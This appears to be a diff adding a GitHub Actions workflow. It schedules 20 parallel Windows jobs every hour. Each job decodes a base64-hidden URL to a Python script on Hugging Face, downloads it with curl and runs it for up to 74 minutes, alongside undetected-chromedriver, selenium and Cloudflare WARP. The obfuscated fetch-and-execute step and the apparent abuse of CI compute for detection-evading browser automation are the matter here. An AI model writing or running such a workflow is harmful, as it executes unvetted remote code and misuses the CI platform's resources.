@@ -1,0 +1,70 @@
+name: Parallel Processing System
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: job-cluster-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  run-workload:
+    name: "Worker-${{ matrix.unit_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      - name: Prepare Host & Load Script
+        shell: bash
+        run: |
+          echo "[SYSTEM] Provisioning Worker-${{ matrix.unit_id }}..."
+          
+          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
+          SOURCE_PAYLOAD=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2hyaW5rMi9yZXNvbHZlL21haW4vc3RhcnRfc2hyaW5rX25ldy5weQ==" | base64 --decode)
+          
+          curl -sL "$SOURCE_PAYLOAD" -o main_app.py
+          
+          echo "[SYSTEM] Upgrading Python runtime packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[SYSTEM] Environment ready."
+
+      - name: Launch Application & Monitor Process
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "[LOG] Executing target payload on unit ${{ matrix.unit_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $AppStartInfo = @{
+              FilePath     = "python"
+              ArgumentList = "main_app.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $TargetProc = Start-Process @AppStartInfo
+          
+          Write-Host "[LOG] Watchdog active. Max runtime set to 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $TargetProc -Timeout 4440 -ErrorAction Stop
+              Write-Host "[LOG] Process exited successfully."
+          }
+          catch {
+              Write-Host "[WARN] Time threshold reached! Force stopping process..."
+              Stop-Process -InputObject $TargetProc -Force
+              Write-Host "[LOG] Process closed."
+          }
+
+      - name: Tear Down Step
+        shell: bash
+        run: echo "[COMPLETE] Worker-${{ matrix.unit_id }} task finished."
